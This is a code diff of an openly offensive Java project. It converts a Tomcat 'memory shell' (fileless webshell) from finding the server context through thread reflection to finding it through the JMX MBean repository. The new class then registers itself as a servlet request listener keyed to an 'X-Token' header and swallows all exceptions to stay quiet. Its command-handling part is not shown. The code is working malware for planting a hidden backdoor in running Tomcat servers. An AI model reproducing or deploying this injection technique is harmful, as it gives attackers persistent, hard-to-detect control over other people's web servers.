@@ -1,77 +1,45 @@
-package com.demo.memshell;
+package com.demo.memshell.whole.exec;
+
+import com.sun.jmx.mbeanserver.NamedObject;
 
 import javax.servlet.ServletRequestEvent;
 import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 import java.io.InputStream;
 import java.io.PrintWriter;
+import java.lang.management.ManagementFactory;
 import java.lang.reflect.Field;
+import java.util.Set;
 
 /**
  * @author Whoopsunix
- * Thread 获取上下文注入 Tomcat Listener 型内存马
+ * JMX 获取 StandardContext 注入 Tomcat Listener 型内存马
  * Tomcat 7 8 9
  */
-public class TomcatListenerThreadMS implements ServletRequestListener {
-    private static HttpServletRequest request;
-    private static HttpServletResponse response;
+public class TomcatListenerJMXMS implements ServletRequestListener {
     private static String header = "X-Token";
-
-    public TomcatListenerThreadMS() {
+    public TomcatListenerJMXMS() {
 
     }
 
     static {
         try {
-            /**
-             * 获取 request、response 对象
-             */
-            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
-            boolean isFind = false;
-            for (int i = 0; i < threads.length; i++) {
-                if (isFind) break;
-                Thread thread = threads[i];
-                // Thread 筛选
-                if (thread == null)
-                    continue;
-                String threadName = thread.getName();
-                if (!(
-                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
-                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
-                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
-                ))
-                    continue;
-                Object target = getFieldValue(thread, "target");
-                Object this0 = getFieldValue(target, "this$0");
-                Object handler = getFieldValue(this0, "handler");
-                Object global = getFieldValue(handler, "global");
-                java.util.List processors = (java.util.List) getFieldValue(global, "processors");
-
-                for (int j = 0; j < processors.size(); j++) {
-                    Object processor = processors.get(j);
-                    Object req = getFieldValue(processor, "req");
-                    request = (HttpServletRequest) req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));
-                    response = (HttpServletResponse) request.getClass().getMethod("getResponse").invoke(request);
-                    isFind = true;
-                    break;
-                }
+            javax.management.MBeanServer mbeanServer = ManagementFactory.getPlatformMBeanServer();
+//            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
+            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (com.sun.jmx.interceptor.DefaultMBeanServerInterceptor) getFieldValue(mbeanServer, "mbsInterceptor");
+            com.sun.jmx.mbeanserver.Repository repository = (com.sun.jmx.mbeanserver.Repository) getFieldValue(defaultMBeanServerInterceptor, "repository");
+            Set<NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            if (objectSet.size() == 0) {
+                // springboot 中是 Tomcat
+                objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
             }
-
-            /**
-             * 注入 Listener
-             */
-            Object standardContext;
-            try {
-                Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
-                Object applicationContext = getFieldValue(servletContext, "context");
-                standardContext = getFieldValue(applicationContext, "context");
-            } catch (NoSuchMethodException e) {
-                standardContext = getFieldValue(request, "context");
+            for (NamedObject namedObject : objectSet) {
+                javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
+                Object authenticatorBase = getFieldValue(dynamicMBean, "resource");
+                Object standardContext =  getFieldValue(authenticatorBase, "context");
+                TomcatListenerJMXMS listenerMemShell = new TomcatListenerJMXMS();
+                standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
             }
-            TomcatListenerThreadMS listenerMemShell = new TomcatListenerThreadMS();
-            standardContext.getClass().getMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
-
         } catch (Exception e) {
         }
     }
